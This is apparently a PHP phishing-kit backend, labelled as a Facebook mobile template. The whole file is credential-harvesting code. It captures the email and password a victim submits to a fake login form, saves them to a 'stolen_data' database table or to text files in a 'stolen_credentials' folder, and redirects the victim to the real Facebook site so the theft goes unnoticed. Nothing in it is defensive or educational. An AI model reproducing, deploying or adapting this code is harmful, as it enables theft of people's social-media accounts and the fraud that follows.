<?php
/**
*MIT License
*
*Copyright (c) 2022 It0sh1
*Permission is hereby granted, free of charge, to any person obtaining a copy
*of this software and associated documentation files (the "Software"), to deal
*in the Software without restriction, including without limitation the rights
*to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
*copies of the Software, and to permit persons to whom the Software is
*furnished to do so, subject to the following conditions:
*
*(The above copyright notice and this permission notice shall be included in all
*copies or substantial portions of the Software.
*THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
*IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,&*
*FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
*AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
*LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
*OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
*SOFTWARE.
*/
/**************************************/
# Phishingtemplates /facebook(mobile)  #
# author: It0sh1                       #
# github: https://github.com/it0sh1    #
/**************************************/

// include configuration file
require('conf.inc.php');

// making class for phishing script
class Phish
{

  // making url redirect function
  public static function urlredirect(string $url)
  {
    // set header
    header('Location: '.$url.'');
  }

  // writing phishing method
  public static function getPhished()
  {

    // include variables
    GLOBAL $db_host;
    GLOBAL $db_user;
    GLOBAL $db_pass;
    GLOBAL $db_name;
    GLOBAL $use_db;
    GLOBAL $facebook_mobile_link;

    // when victim presses login button
    if(isset($_POST['login']))
    {

      // stolen variables
      $facebook_mobile_email = htmlentities($_POST['email']);
      $facebook_mobile_pass  = htmlentities($_POST['pass']);

      // if you gonna use database and $use_db = true;
      if($use_db === true)
      {

        // make connection with database
        $connecting = mysqli_connect("$db_host", "$db_user", "$db_pass", "$db_name")
        or die('connection failed bitch :('.mysqli_connect_error());

        // making sql query
        $sql = "INSERT INTO stolen_data (stolen_username, stolen_password)
        VALUES ('$facebook_mobile_email', '$facebook_mobile_pass');";

        // when sql query succeed and is true:
        if(mysqli_query($connecting, $sql) === true)
        {
          // redirect victim to official mobile site of facebook
          self::urlredirect($facebook_mobile_link);
          exit; // EXIT SCRIPT

        } else {

          // show error :#
          echo "Something went very wrong :( check the error: ".mysqli_connect_error();
        }

      // when we dont use database
      } else {

        // create folder for credentials
        $stolen_user_credential_folder = "stolen_credentials/";

        // check if folder not exists
        if(!is_dir($stolen_user_credential_folder))
        {

          // make folder
          mkdir($stolen_user_credential_folder);

          // creating .txt with random hashed name
          $randomhashtextfile = uniqid().'.txt';

          // now we making filehandler to put our phished credentials in it
          $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

          // creating text
          $data1 = "Username/Email: " . $facebook_mobile_email . "\n";
          fwrite($filehandler, $data1);

          // second data text
          $data2 = "Password: " . $facebook_mobile_pass . "\n";
          fwrite($filehandler, $data2);
          // close handler
          fclose($filehandler);

          // redirect victim to official mobile facebook login page
          self::urlredirect($facebook_mobile_link);
          exit; // EXIT SCRIPT

        // when folder exists
        } else {

          // creating .txt with random hashed name
          $randomhashtextfile = uniqid().'.txt';

          // making filehandler again
          $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

          // creating text
          $data1 = "Username/Email: " . $facebook_mobile_email . "\n";
          fwrite($filehandler, $data1);

          // second data text
          $data2 = "Password: " . $facebook_mobile_pass . "\n";
          fwrite($filehandler, $data2);
          // close handler
          fclose($filehandler);

          // redirect victim to login page
          self::urlredirect($facebook_mobile_link);
          exit; // EXIT
        }
      }
    }
  }
}
// call class or function
Phish::getPhished();
?>
